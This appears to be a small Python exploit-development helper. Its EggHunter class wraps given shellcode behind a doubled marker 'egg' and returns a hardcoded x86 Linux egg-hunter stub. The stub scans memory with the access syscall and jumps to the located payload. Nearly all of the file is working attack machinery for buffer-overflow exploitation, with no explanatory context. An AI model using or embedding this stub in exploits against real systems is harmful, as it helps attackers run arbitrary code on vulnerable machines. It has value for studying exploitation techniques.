class EggHunter:
  def __init__(self, shellcode, egg):
    self.__shellcode = shellcode;
    self.__egg = egg;

  def generate(self):
    return self.__egg+self.__egg+self.__shellcode

  def hunter_code(self):
    return "\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x8d\\x5a\\x04\\x31\\xc0\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x74\\xed\\xb8"+self.__egg+"\\x89\\xd7\\xaf\\x75\\xe8\\xaf\\x75\\xe5\\xff\\xe7"

